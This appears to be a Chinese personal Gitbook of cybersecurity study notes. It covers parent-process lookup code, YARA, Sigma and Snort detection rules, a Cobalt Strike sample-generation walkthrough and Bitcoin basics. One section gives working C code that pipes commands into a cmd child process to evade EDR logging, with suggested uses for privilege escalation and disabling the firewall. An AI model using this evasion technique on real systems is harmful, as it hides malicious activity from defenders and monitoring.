Process.GetProcessById() 方法根据父进程 ID 获取父进程对象。 C #include #include #include #include #include //GetModuleFileNameEx int main() { // 获取当前进程句柄 HANDLE currentProcess = GetCurrentProcess(); // 获取当前进程 ID DWORD currentProcessId = GetProcessId(currentProcess); // 获取进程快照 HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snapshot == INVALID_HANDLE_VALUE) { printf(\"CreateToolhelp32Snapshot failed, error code %d\\n\", GetLastError()); return 0; } PROCESSENTRY32 processEntry; processEntry.dwSize = sizeof(PROCESSENTRY32); // 遍历进程快照，查找父进程 if (Process32First(snapshot, &processEntry)) { do { if (processEntry.th32ProcessID == currentProcessId) { // 获取当前进程的父进程 ID DWORD parentProcessId = processEntry.th32ParentProcessID; // 根据父进程 ID 获取父进程句柄 HANDLE parentProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, parentProcessId); if (parentProcess != NULL) { // 获取父进程的名称 TCHAR parentProcessName[MAX_PATH]; if (GetModuleFileNameEx(parentProcess, NULL, parentProcessName, MAX_PATH)) { // 判断父进程名称是否为 explorer.exe if (_tcsicmp(parentProcessName, _T(\"explorer.exe\")) == 0) { printf(\"The parent process is explorer.exe.\\n\"); } else { printf(\"The parent process is %ws.\\n\", parentProcessName); } } else { printf(\"GetModuleFileNameEx failed, error code %d\\n\", GetLastError()); } CloseHandle(parentProcess); } else { printf(\"OpenProcess failed, error code %d\\n\", GetLastError()); } break; } } while (Process32Next(snapshot, &processEntry)); } else { printf(\"Process32First failed, error code %d\\n\", GetLastError()); } CloseHandle(snapshot); return 0; } 使用 GetCurrentProcess() 获取当前进程的句柄。 使用 GetProcessId() 获取当前进程的 ID。 使用 CreateToolhelp32Snapshot() 创建进程快照。 遍历进程快照，查找父进程。使用 Process32First() 获取第一个进程的信息，然后使用 Process32Next() 遍历下一个进程，直到找到当前进程。 获取当前进程的父进程 ID，并使用 OpenProcess() 函数打开父进程的句柄。 使用 `GetModuleFileName Linux 因为linux是基于文件的，所以需要通过文件来获得进程名称，但是linux有现成的函数可以直接得到父进程的pid，各有千秋。 进程对应的进程号在/proc目录下存在一个对应pid的目录。 随便进去一个可以看到很多文件 comm文件里面存放的就是进程的名称 C #include #include #include #include #include int main() { pid_t pid = getpid(); pid_t ppid = getppid(); char filename[256]; // 获取当前进程名称 snprintf(filename, sizeof(filename), \"/proc/%d/comm\", pid); // 构造文件名 FILE* fp = fopen(filename, \"r\"); // 打开文件 if (fp) { char name[256]; fgets(name, sizeof(name), fp); // 读取进程名称 name[strcspn(name, \"\\n\")] = 0; // 去除换行符 printf(\"current process name: %s\\n\", name); fclose(fp); // 关闭文件 } else { printf(\"failed to open file: %s\\n\", filename); } // 获取父进程的进程名称 snprintf(filename, sizeof(filename), \"/proc/%d/comm\", ppid); // 构造文件名 fp = fopen(filename, \"r\"); // 打开文件 if (fp) { char name[256]; fgets(name, sizeof(name), fp); // 读取进程名称 name[strcspn(name, \"\\n\")] = 0; // 去除换行符 printf(\"current process parent name: %s\\n\", name); fclose(fp); // 关闭文件 } else { printf(\"failed to open file: %s\\n\", filename); } return 0; } 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 19:46:56 "},"MyArticles/CyberSec.html":{"url":"MyArticles/CyberSec.html","title":"CyberSec","keywords":"","body":"雪暗凋旗画，风多杂鼓声。宁为百夫长，胜作一书生。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 13:40:33 "},"MyArticles/CyberSec/免杀手法收集.html":{"url":"MyArticles/CyberSec/免杀手法收集.html","title":"免杀手法收集","keywords":"","body":"phobos样本 利用管道通信传递参数 利用CreateProcess调用出cmd之后，如果直接将cmd的参数放进api中，则会被EDR进行记录，可以使用管道通信的形式去传递参数。可以使用runas命令提权或者是关闭防火墙命令。 进程间通信（IPC）机制 进程间通信（IPC）机制是指同一台计算机的不同进程之间或网络上不同计算机进程之间的通信。Windows下的方法包括邮槽（Mailslot）、管道（Pipes）、事件（Events）、文件映射（FileMapping）等。 管道分有名和匿名两种。 命名管道：可以在同台机器的不同进程间以及不同机器上的不同进程之间进行双向通信。 匿名管道：只在父子进程之间或者一个进程的两个子进程之间进行通信，它是单向的。 管道操作标示符是HANDLE，利用这个机制，直接使用ReadFile or WriteFile就可以实现了 若2个进程无“父子“关系，且子进程又未继承父进程资源，则这俩进程无法使用Pipe传递数据。 过程 创建两个匿名管道，一个读一个写。 创造一个子进程，将输入输出句柄重定向到管道 用ReadFile()和WriteFile()读写管道实现进程的通信 例子 利用程序创建cmd子进程执行一个弹出计算器的命令。 #include #include #include #include int main() { // frist create two pipe, because the anonymous pipe is unidirectional HANDLE hReadPipe; HANDLE hWritePipe; SECURITY_ATTRIBUTES sa = { 0 }; sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.bInheritHandle = TRUE; if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) { printf(\"CreatePipe Failed %d\\n\", GetLastError()); return 1; } HANDLE hReadPipe1; HANDLE hWritePipe1; if (!CreatePipe(&hReadPipe1, &hWritePipe1, &sa, 0)) { printf(\"CreatePipe1 Failed %d\\n\", GetLastError()); return 1; } // create a process cmd STARTUPINFO si = { 0 }; PROCESS_INFORMATION pi = { 0 }; ZeroMemory(&si, sizeof(si)); ZeroMemory(&pi, sizeof(pi)); //relocaltion stdout, // Turn the input of the child process into a read pipe si.hStdInput = hReadPipe; // Turn the output of the child process into a write pipe si.hStdOutput = hWritePipe1; si.hStdError = hWritePipe1; si.dwFlags = STARTF_USESTDHANDLES; LPTSTR program = L\"C:\\\\Windows\\\\System32\\\\cmd.exe\"; if (!CreateProcessW(program, NULL, 0, 0, TRUE, 0, 0, 0, &si, &pi)) { printf(\"CreateProcess Failed %d\\n\", GetLastError()); return 1; } // send command to cmd.exe, cmd.exe stop by \"\\r\\n\" char lpBuffer[] = \"calc\\r\\n\"; if (!WriteFile(hWritePipe, lpBuffer, (DWORD)strlen(lpBuffer)+1, NULL, 0)) { printf(\"WriteFile Failed %d\\n\", GetLastError()); return 1; } CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0; } 上述代码执行之后可以调用cmd弹出一个calc。还可以通过设置 CreateProcessW(program, NULL, 0, 0, TRUE, 0, 0, 0, &si, &pi)的第六个参数来设置新进程不可见 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-04-08 21:58:20 "},"MyArticles/CyberSec/yara.html":{"url":"MyArticles/CyberSec/yara.html","title":"YARA学习","keywords":"","body":"官方文档说明：https://yara.readthedocs.io/en/v3.7.0/index.html 官方的github库地址：https://github.com/VirusTotal/yara/releases bilibili学习分享：https://www.bilibili.com/video/BV1dt4y12753/ Yara是什么 YARA is a tool aimed at (but not limited to) helping malware researchers to identify and classify malware samples. With YARA you can create descriptions of malware families (or whatever you want to describe) based on textual or binary patterns. Each description, a.k.a rule, consists of a set of strings and a boolean expression which determine its logic.【https://virustotal.github.io/yara/】 yara用处 样本分类 快速筛选 过滤文件 自定义CTF题目类型 完成任务 识别漏洞 安装 windows 直接下载之后解压，在path变量里写入路径，可以在终端直接yara Mac brew install yara 使用 命令解释 > yara --help YARA 4.2.2, the pattern matching swiss army knife. Usage: yara [OPTION]... [NAMESPACE:]RULES_FILE... FILE | DIR | PID Mandatory arguments to long options are mandatory for short options too. --atom-quality-table=FILE path to a file with the atom quality table -C, --compiled-rules 加载已经编译的规则 -c, --count 显示中标的样本个数 -d, --define=VAR=VALUE 定义外部变量 --fail-on-warnings 出现警告时运行失败 -f, --fast-scan 快速匹配模式 -h, --help 显示帮助并退出 -i, --identifier=IDENTIFIER 只显示名为IDENTIFIERd --max-process-memory-chunk=NUMBER 设置扫描进程的最大值 (default=1073741824) -l, --max-rules=NUMBER 扫描达到设定值后退出 --max-strings-per-rule=NUMBER 设定每个进程的最大字符串匹配数(default=10000) -x, --module-data=MODULE=FILE 将FIle的内容作为额外的数据传递给MOUDLE -n, --negate 只显示不满足的规则 (negate) -N, --no-follow-symlinks 扫描时不跟随符号连接 -w, --no-warnings 禁用警告 -m, --print-meta 打印元数据 -D, --print-module-data 打印模块数据 -e, --print-namespace 显示规则的命名空间 -S, --print-stats 打印规则的统计信息 -s, --print-strings 打印匹配的字符串 -L, --print-string-length 打印匹配字符串的长度 -g, --print-tags 打印标签 -r, --recursive 递归扫描目录 --scan-list 扫描FILE中列出的文件，每行显示以一个 -z, --skip-larger=NUMBER 跳过目录中size大于设置size的文件 -k, --stack-size=SLOTS 设置最大堆栈的大小 (default=16384) -t, --tag=TAG 只打印标记为tag的规则 -p, --threads=NUMBER 使用指定的线程数扫描目录 -a, --timeout=SECONDS 在达到给定的时间（s）之后跳出扫描 -v, --version 显示yara的当前版本信息 Send bug reports and suggestions to: vmalvarez@virustotal.com. 向 vmalvarez@virustotal.com 发送建议和bug 一般结构 banker.yara文件： rule silent_banker : banker { meta: description = \"This is just an example\" thread_level = 3 in_the_wild = true strings: $a = {6A 40 68 00 30 00 00 6A 14 8D 91} $b = {8D 4D B0 2B C1 83 C0 27 99 6A 4E 59 F7 F9} $c = \"UVODFRYSIHLNWPEJXQZAKCBGMT\" condition: $a or $b or $c } 规则一般写在后缀为yara的文件里。利用yara banker.yara来执行 第一行：对于该yara规则的说明。指出这是一个banker类型的样本匹配规则 第三行：meta关键字后面跟一些面描述信息。 第七行：strings关键字后：定义了三个变量，利用{}的形式写16进制字符串 第十一行：condition关键字后：利用or关键字表示如果匹配文件中了其中一个，则算为banker malware。 可以看到： 16进制 ==》 {} 通配符 使用?作为通配符，可以代表任何内容，大小是一个半个字节。 rule WildcardExample { strings: $hex_string = { E2 34 ?? C8 A? FB } condition: $hex_string } 跳转 利用[n-n+x]的方式进行跳转，指的是跳过一定数量的字节。如下程序是跳过4-6个字节 rule JumpExample { strings: $hex_string = { F4 23 [4-6] 62 B4 } condition: $hex_string } [-]代表无限制跳转，不限制跳转个数 字符串 ==》 “str” nocase：不区分大小写，适用于字符串 base64：base64字符串 xor：异或字符串 wide：宽字符 wide 如果字符串“Borland”显示为编码为每个字符两个字节（即 ），则以下规则将匹配：B\\x00o\\x00r\\x00l\\x00a\\x00n\\x00d\\x00 rule WideCharTextExample1 { strings: $wide_string = \"Borland\" wide condition: $wide_string } xor 搜索应用于字符串“ ”（包括纯文本字符串）的每个字节 XOR形式： rule XorExample5 { strings: $xor_string = \"This program cannot\" xor(0x01-0xff) condition: $xor_string } 这就等效于 rule XorExample2 { strings: $xor_string_00 = \"This program cannot\" $xor_with_1 = \"Uihr!qsnfs`l!b`oonu\" $xor_with_2 = \"Vjkq\\\"rpmepco\\\"acllmv\" …… condition: any of them } base64 rule Base64Example1 { strings: $a = \"This program cannot\" base64 condition: $a } 支持自定义的base码表 rule Base64Example2 { strings: $a = \"This program cannot\" base64(\"!@#$%^&*(){}[].,|ABCDEFGHIJ\\x09LMNOPQRSTUVWXYZabcdefghijklmnopqrstu\") condition: $a } 字符串计数 该字符串在文件或进程内存中出现了多少次。每个字符串的出现次数由一个变量表示，该变量的名称是字符串标识符，但用 # 字符代替 $ 字符 rule CountExample { strings: $a = \"dummy1\" $b = \"dummy2\" condition: #a == 6 and #b > 10 } 从YARA 4.2.0开始，可以在整数范围内表示字符串的计数 #a in (filesize-500..filesize) == 2 代表了文件最后500字节的数据内必须存在a字符串两次 字符串集 命中多个字符串的其中一个就可以 rule OfExample1 { strings: $a = \"dummy1\" $b = \"dummy2\" $c = \"dummy3\" condition: 2 of ($a,$b,$c) } 文件中必须至少存在集合中的两个字符串（$a，$b，$c）。 也可以使用通配符来写： rule OfExample2 { strings: $foo1 = \"foo1\" $foo2 = \"foo2\" $foo3 = \"foo3\" condition: 2 of ($foo*) } rule OfExample3 { strings: $foo1 = \"foo1\" $foo2 = \"foo2\" $bar1 = \"bar1\" $bar2 = \"bar2\" condition: 3 of ($foo*,$bar1,$bar2) } 甚至也可以写成 condition: 1 of them 从YARA 4.2.0开始，可以在整数范围内表示一组字符串，如下所示： all of ($a*) in (filesize-500..filesize) any of ($a*, $b*) in (1000..2000) 添加过滤 size过滤 在从大量的文件中获取样本时，可能需要根据样本的大小特征进行过滤；否则会对每一个文件都进行匹配 condition: filesize > 200KB and filesize 入口点过滤 yara3.0之前可以用entry_point来获得程序入口点；yara3.0之后通过pe.entry_point变量来获得入口点 注意：入口点的地址需要写offset（File Offset），并不是在ida中看到的entry_point。[这个是自动获取的，不需要预先定义]。 condition: pe.entry_point == 0x990 at取值 同样适用于匹配入口点. string: $entry = {48 83 EC 28} condition: $entry at pe.entry_point 这里利用的是匹配入口点地址对应的数据 文件头判断 利用uint16(0) 的方式取文件的前两个字节，可以判断一般文件的文件头。 condition: unit16(0) == 0x4D5A and uint32(uint32(0x3C)) == 0x00004550 0x4D5A是一般PE文件的开头 ”MZ“ . ps: uint16是16位无符号整型，就是两个字节 之上提到的所有condition都可以通过and进行连接 访问给定位置的数据 使用下列函数之一从给定偏移量的文件读取数据： int8() int16() int32() uint8() uint16() uint32() int8be() int16be() int32be() uint8be() uint16be() uint32be() 函数从读取 8、16 和 32 位有符号整数，而函数读取无符号整数。16 位和 32 位整数都被视为小端序。 迭代器 for..of for any section in pe.sections : ( section.name == \".text\" ) 相当于是 for any i in (0..pe.number_of_sections-1) : ( pe.sections[i].name == \".text\" ) 迭代字典时，必须提供两个变量名称，用于保存字典中每个条目的键和值 for any k,v in some_dict : ( k == \"foo\" and v == \"bar\" ) 规则条件 and：与 or：或 not：非 [all of them]：所有条件匹配即告警 [any of them]：有一个条件匹配即告警 [a and b and $c]：abc同时匹配即告警 [(a and b) or $c]：匹配a和b或c即告警 引用其他规则 利用规则集的形式引用其他规则 rule Rule1 { strings: $a = \"dummy1\" condition: $a } rule Rule2 { strings: $a = \"dummy2\" condition: $a } rule MainRule { strings: $a = \"dummy2\" condition: any of (Rule*) } 演示 cs启用 一个压缩包包含了服务端和客户端 在服务端用sudo运行./teamserver 服务器ip 密码，vps注意提前打开端口 客户端运行start.bat，直接按照刚才的方式连接就行。用户名随意 到这里就可以用了。 打开attack 这里可以生成一个很简单的malware 然后在指定目录生成一个rat。注意关闭杀毒软件，不然直接杀 提取特征工具 010editor：查看文件类型、文件对比、HEX查看 调试器：查找特征值 CFF、PEstudio等pe工具分析PE文件 一些文件格式的总结 运用 自动化工具 yargen：是一个自动化提取yara规则的工具，可以提取strings和opcodes特征，其原理是先解析出样本集中的共同的字符串，然后经过白名单库的过滤，最后通过启发式、机器学习等方式筛选出最优的yara规则。访问地址 更加高效 避免创建常见的导入导出表的规则，因为相同编译器的结果基本一样 通过文件头之类的文件特征进行初筛 设定大小，防止耗尽资源本机蓝屏 匹配互斥体、注册表值、PDB路径、硬编码的密钥或者密文、C2地址 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-03-19 15:47:10 "},"MyArticles/CyberSec/sigma规则学习.html":{"url":"MyArticles/CyberSec/sigma规则学习.html","title":"sigma规则学习","keywords":"","body":"sigma规则是面对日志检测的规则，yara是面对文件检测的规则，snort是面向网络检测的规则。主要通过对sigma规则的学习，了解Windows上的日志工作原理和作用。 sigma的官方库 据说比较好的资料：Loginsoft Blog - Threat Detection with SIGMA Rules 官方库推荐的文章：https://www.nextron-systems.com/2018/02/10/write-sigma-rules/ 前置 SIEM 参考：什么是安全信息与事件管理 (SIEM)？| IBM 安全信息和事件管理 (SIEM) 方案融合了安全信息管理 (SIM) 和安全事件管理 (SEM)，可提供对事件的实时监控和分析，以及出于合规性或审计目的跟踪和记录安全数据。 SIEM 是一种安全解决方案，可帮助组织及早识别潜在的安全威胁和漏洞，以免业务运营遭受破坏。 反正总而言之他就是一个一体化的一个实时的安全检测平台，这个平台可以动态实时的收集、分析数据，帮助企业减少外部攻击的伤害，日志分析是他的一个功能。 yaml YAML 是一种较为人性化的数据序列化语言，可以配合目前大多数编程语言使用。 YAML 的语法比较简洁直观，特点是使用空格来表达层次结构，其最大优势在于数据结构方面的表达，所以 YAML 更多应用于编写配置文件，其文件一般以 .yml 为后缀。sigma的规则一般采用的是yaml格式。 该语言是： 大小写敏感 标识注释 缩进不能使用tab，必须用空格（校赛平台配置题目就是yaml） 同级必须上下对齐 用“ --- ”即三个破折号表示一份内容的开始 用“ ... ”即三个小数点表示一份内容的结束（非必需） 使用“冒号+空格”来分开键与值 支持流式风格（ Flow style） key: { child-key1: value1, child-key2: value2 } “破折号+空格”开头的数据组成一个数组 values: - value1 - value2 - value3 字符串一般不需要用引号包裹，但是如果字符串中使用了反斜杠“\\”开头的转义字符就必须使用引号包裹 “true”、“True”、“TRUE”、“yes”、“Yes”和“YES”皆为真 “false”、“False”、“FALSE”、“no”、“No”和“NO”皆为假 “null”、“Null”和“~”都是空，不指定值默认也是空 6.8523015e+5 # 使用科学计数法 0001_0000 # 二进制表示 YAML 也支持 ISO 8601 格式的时间数据 date1: 2020-05-26 date2: 2020-05-26T01:00:00+08:00 dete3: 2020-05-26T02:00:00.10+08:00 date4: 2020-05-26 03:00:00.10 +8 sigma Sigma是一种通用且开放的检测规则格式（SIEM 系统的通用签名格式）。也支持进行不同SIEM系统的格式转换。同时Sigma可以通过行为规则生成ATT&CK Navigator热力图，直观看到行为模型的覆盖程度。 该项目运行需要基于python，不像yara那样自己就能跑。他为啥就不能像yara那样自己集成一个exe呢？ 根据介绍可以看到他使用起来还是比较方便的。nmd这个玩意没有官方文档，就一个youtube的视频。 sigma 主要组成 主要有三个组成部分： 通用Sigma规则格式的语言规范。 Sigma签名的开放存储库，包含针对多个攻击者行为和技术的1000多条规则。 Sigmac是一个转换实用程序，用于把Sigma规则转为不同的SIEM工具所支持的搜索查询语句。 简介 Sigma规则是用YAML编写的，它定义了在系统日志中查找的内容和位置。 每个Sigma规则还可以指定元数据，例如：规则的作者、唯一规则标识符 (UUID)、MITRE ATT&CK技术和参考。 支持日志类型： 防火墙日志 Web应用程序日志 代理/VPN网络日志 操作系统日志 事件日志 进程创建和审核日志 系统事件 基础框架 title: 这是一个例子 （标题） id: 5ea8faa8-db8b-45be-89b0-151b84c82702（编号） status: 实验 （状态） description: 关于目标的一些描述 （描述） author: yunzui （作者） date: 2022/07/31 （日前） modified: 2022/07/31 references: （参考） - 参考文章的地址，还是有启发意义的 tags: （对应的ATT&CK） - attack.initial_access - attack.t1190 logsource: （日志） category: webserver # 上面的东西都没啥实际效果，重要的都在下面，上面的除了tags和logsource随便写就行，不影响准确性 detection: （检测） keywords: （匹配特征） - 'yunzui' filter: （过滤） - 'mitian' condition: keywords and not filter （命令逻辑） falsepositives: （误报） - 描述字段，用于解释哪些事件或情况可能触发导致误报的规则 level: high （安全级别） 随便挑一个yml对比一下就很清楚了 cmd删除命令日志 以存储库中的Sigma规则/rules/windows/process_creation/proc_creation_win_cmd_del_execution.yml为例，此规则检测使用Windows Cmd命令删除文件。 title: File Deletion Via Del id: 379fa130-190e-4c3f-b7bc-6c8e834485f3 status: experimental description: | Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files. Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. 检测为了删除文件而执行的内置“ del”/“擦除”命令。对手可能会删除他们的入侵行为留下的文件。恶意软件、工具或其他非本地文件丢弃或创建的系统上的对手可能会留下痕迹，以表明在网络中做了什么以及如何做。 删除这些文件可能发生在入侵期间，或者作为入侵后过程的一部分，以尽量减少对手的足迹。 references: - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase author: frack113 date: 2022/01/15 modified: 2023/03/06 tags: - attack.defense_evasion - attack.t1070.004 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\\cmd.exe' - OriginalFileName: 'Cmd.Exe' selection_del: CommandLine|contains: - 'del ' - 'erase ' selection_flags: CommandLine|contains: - ' /f' # Force deleting of read-only files. - ' /s' # Delete specified files from all subdirectories. - ' /q' # Quiet mode, do not ask if ok to delete on global wildcard condition: all of selection_* falsepositives: - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity level: low 目录详情 logsource 描述了要应用检测的日志数据。Logsource schema如下，它可以使用以下仨属性中的一个或多个： category [optional] 用于选择某个系列产品生成的所有日志，例如：防火墙和Web服务器日志。 类别示例包括：防火墙、防病毒、EDR、Web。 product [optional] 用于选择特定产品生成的所有日志，例如：Windows、Apache。 产品类型可以更进一步划分，例如：Windows日志类型可分为安全日志、系统日志、应用日志、和Windows Defender日志等。 service [optional] 仅用于选择产品日志的子集，例如：Windows系统上的安全事件日志。 definition 含一组搜索标识符，表示对日志数据的搜索及其各自的评估机制，由两个属性控制： selection(选择)：搜索日志数据的标识符。该关键词包含很多后缀。 condition(条件)：定义如何评估选择或过滤。是全要还是中一个就行还是其他条件。 检测可以由Lists和Maps两种数据结构组成。比如下面两个例子： # from rules\\windows\\process_creation\\proc_creation_win_cmd_del_execution.yml detection: selection_img: - Image|endswith: '\\cmd.exe' - OriginalFileName: 'Cmd.Exe' selection_del: CommandLine|contains: - 'del ' - 'erase ' selection_flags: CommandLine|contains: - ' /f' # Force deleting of read-only files. - ' /s' # Delete specified files from all subdirectories. - ' /q' # Quiet mode, do not ask if ok to delete on global wildcard condition: all of selection_* # from rules\\windows\\process_creation\\proc_creation_win_cmd_unusual_parent.yml detection: selection: Image|endswith: '\\cmd.exe' ParentImage|endswith: - '\\csrss.exe' - '\\ctfmon.exe' - '\\dllhost.exe' - '\\epad.exe' - '\\FlashPlayerUpdateService.exe' - '\\GoogleUpdate.exe' - '\\jucheck.exe' - '\\jusched.exe' - '\\LogonUI.exe' - '\\lsass.exe' - '\\regsvr32.exe' - '\\SearchIndexer.exe' - '\\SearchProtocolHost.exe' - '\\SIHClient.exe' - '\\sihost.exe' - '\\slui.exe' - '\\spoolsv.exe' - '\\sppsvc.exe' - '\\taskhostw.exe' - '\\unsecapp.exe' - '\\WerFault.exe' - '\\wergmgr.exe' - '\\wlanext.exe' - '\\WUDFHost.exe' condition: selection 具体应用 Tactics, Techniques and Procedures（战术、技术以及步骤），作为一种常用的威胁狩猎的方式，一般用于发现潜在的威胁，他是IOCs的超集，IOC是易失的，但是TTPs一般不会改变，利用sigma规则可以直接通过TTPs进行工作，但是yara只能通过IOCs的静态匹配进行工作。 这个痛苦金字塔里，TTPs在最顶层，对于一个成熟的组织来说，改变成本是巨大的。具体来说就是我们可以利用sigma直接去匹配进程名称和启动的父进程等等的信息。 sigmac 要将Sigma规则转换为任何SIEM平台所支持的搜索查询语句，需要使用sigmac进行“编译处理”。下图是在ubuntu18上执行成功的python3.6.6 版本问题 最开始的sigma版本：https://github.com/SigmaHQ/sigma，但是在readme里面，作者提到了： 看起来好像是该仓库不再受到支持了，最近一次更新是在4个月前。该中还是有近期的提交记录的，所以主要功能还是使用这个库为主（不是CLI的库）。 平台使用 基于python写的程序，linux和Windows应该都可以使用，但是在Windows使用的时候，他无法定位到自己的库中类或者函数，他的from import 是有问题的，在Linux中使用没有任何问题。具体原因还不知道为啥 Windows运行： 需要改一下他import的语法和方式，但是在Ubuntu上可以直接通过 sudo python3 setup.py install #不用sudo会报错。 Windows我改半天一直有问题，不想改了，直接用ubuntu里的就行了。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 11:29:09 "},"MyArticles/CyberSec/snort工作总结.html":{"url":"MyArticles/CyberSec/snort工作总结.html","title":"工作内容 - 产出snort规则","keywords":"","body":"关于snort的中文文档也不少，先根据文档了解一下基本特征，然后就可以参考已有的规则进行学习了，这样比较快。 学习文档：网上多的是，需要注意的是，一定要安装对应版本snort指定版本的wincap程序。 当时下来这些来试的，版本不对是真报错啊。 安装 根据csdn的来就行，注意把里面的unix目录格式改成Windows格式； 我的工作内容就是利用snort进行流量包的匹配，所以这里config需要个性化修改一下。 把其他的都注释掉，添加这一行，这里面存放的是我每一次写的规则。不知道为啥有几个字段会报错，直接不写就行了。 核心是content字段和msg字段，其他的都是锦上添花，sid不能重复，不然就会重叠规则，rev可以一样，无所谓。需要注意的是： rev不同，sid也不能一样，这需要注意一下 每次把上一次的规则注释掉写新的就行了。 规则核心 msg字段，确定是什么家族或者组织。 content字段：要匹配的内容，核心中的核心 pcre字段：正则匹配，和content差不多。 比如：pcre:\"/id=\\d+&vs=\\d+.\\d+&sd=\\w+&os=\\d+&bi=\\d+&ar=\\d+&pc=\\w+-PC&un=\\w+&dm=&av=\\d+&lv=\\d+&og=\\d+/\" 还有一些固定的字段： flow:established,to_client;这是代表向客户端发的流量 flow:established,to_server;这是向服务端发送的流量 这些标签是真的有用，像host字段啥的都属于header nocase关键字：屏蔽大小写 基本常用的就这些字段和标签。 自动化 自动转换 因为从沙箱上拉下来的流量包格式是cap，太老了，snort扫描不了，所以需要先转换一下，并且将名称规范化一下。 def tshark_command_run(): # 源目录和目标目录的路径 source_dir = '***************\\\\从pcap中提取' target_dir = '***************\\\\hash_pcap' # 获取源目录中所有的cap文件列表 cap_files = [f for f in os.listdir(source_dir) if f.endswith('.cap')] # 遍历每个cap文件并进行转换 for cap_file in cap_files: # 构建输入文件和输出文件的完整路径 input_file = os.path.join(source_dir, cap_file) output_file = os.path.join(target_dir, cap_file.split(\"_\")[3] + '.pcap') command = \"E:\\\\Wireshark\\\\tshark.exe -F pcap -r \" + input_file + \" -w \" + output_file # print(command) res = os.system(command) if (res == 2): command = \"copy \" + input_file + \" \" + output_file os.system(command) print(f\"sucess to copy {output_file}\") # time.sleep(0.5) print(f\"转换完成：{cap_file} -> {output_file}\") 自动遍历 一共遍历了11000个pcap，写了一些半自动化的脚本来提高速度。 自动使用规则检查数据包的脚本 def IF_HitRule(log_path): try: ids_path = log_path+\"\\\\\"+\"alert.ids\" if os.path.getsize(ids_path) != 0: # 命中规则 return 1 else: # 没有命中规则 return 0 except: print(log_path) return 0 def run_cmd_silently(cmd): # 执行命令，并将标准输出、标准错误输出都重定向到空设备 subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) def snort_command_run(): print(\"start scan pcap file\") # 源目录和目标目录的路径 source_dir = '************\\\\hash_pcap' # 获取源目录中所有的cap文件列表 cap_files = [f for f in os.listdir(source_dir) if f.endswith('.pcap') or f.endswith('.pcapng')] # 遍历每个cap文件 for cap_file in tqdm(cap_files): log_path = source_dir+\"\\\\log\\\\\"+cap_file # print(log_path) os.system(\"mkdir \"+log_path) command = \"snort -c E:\\\\Snort\\\\etc\\\\snort.conf -l \"+log_path+\" -r \"+cap_file # print(command) # run_cmd_silently(command) os.system(command) time.sleep(1) res = IF_HitRule(log_path) if res == 1: # os.remove(cap_file) os.rename(cap_file, \"OLD4_\"+cap_file) 并且将命中的pcap包改名，就得到了msg_hash.pcap的流量包。 如何判断命中呢？ def IF_HitRule(log_path): try: ids_path = log_path+\"\\\\\"+\"alert.ids\" if os.path.getsize(ids_path) != 0: # 命中规则 return 1 else: # 没有命中规则 return 0 except: print(log_path) return 0 检查生成的ids文件是否有内容，如果有内容就说明命中了。 生成对应关系 领导要求要规则和hash数据包对应，所以写了这个脚本。 def mkrule_txt(): source_dir = '*********\\\\sorted\\\\' # 获取源目录中所有的cap文件列表 cap_files = [f for f in os.listdir(source_dir) if f.endswith('.pcap') or f.endswith('.pcapng')] # 遍历每个cap文件 dict = {} for cap_file in tqdm(cap_files): tmp = cap_file.replace('jan1W', 'jan-W').replace(\"320\", \"32.\").replace(\"GMLtaNHaoMTB\",\"GMLtaNHaoMTB_\") tmp = tmp.split('_') try: msg = tmp[0] hash = tmp[1] except: print(cap_file) continue if msg not in dict: dict[msg] = [] dict[msg].append(hash) print(dict) with open(\"pcap_rules.txt\", \"w\")as file: file.write(json.dumps(dict, ensure_ascii=False, indent=3)) 生成的txt文件长这样，我觉得这么对应起来也挺麻烦，但是领导说行，行就行呗。 总结 我学了yara规则和sigma规则，但是工作内容是snort规则，这倒好，我三大规则都学完了。 现在经济形式不好，企业都在想着办法的挣钱，之前的研发部门现在也要为一线产品赋能了，隔壁组也在为产品提供规则。 没有版权，随便复制，免费的知识应该共享 all right reserved，powered by Gitbook该文章修订时间： 2023-08-24 19:04:03 "},"MyArticles/CyberSec/关于bitcoin.html":{"url":"MyArticles/CyberSec/关于bitcoin.html","title":"啥是Bitcoin","keywords":"","body":"作为一个能直接影响密码学、硬件价格、驱动开发、黑客攻击、经济市场的货币，bitcoin确实是22年之前最火的一种虚拟货币。 简介 1、bitcoin一般用来形容比特币本身，当出现Bitcoin的时候，大概率是在谈论比特币的技术形式。 最小的bit币单位是0.00000001。 2、比特币本身作为一种去中心化的货币，不存在类似中央银行一样的中心节点，所以银行卡丢失可以补办，但是比特币密钥丢失那就寄了。 3、比特币的去中心化技术依托于P2P网络，这是一种端到端的网络模式，《图解密码技术》将其归结为“基于p2p网络的支付结算系统”，比特币用户通过使用这一结算系统实现了价值转移。 4、比特币交易是在比特币地址之间完成的，而且每一次成交的地址一般不同，但是捐赠场景会使用同一个地址。 地址生成 讲DSA的公钥输入SHA-256和RIPEDM-160这俩单项散列算法生成散列值，附加一些必要信息，通过base58check进行编码成字符串（不使用0O，Il）。 生成的地址一般是以“1”开头的base编码字符串。 钱包：比特币用户使用的客户端 区块链 保存比特币全部交易的公共账本，讲交易以区块为单位进行的存储 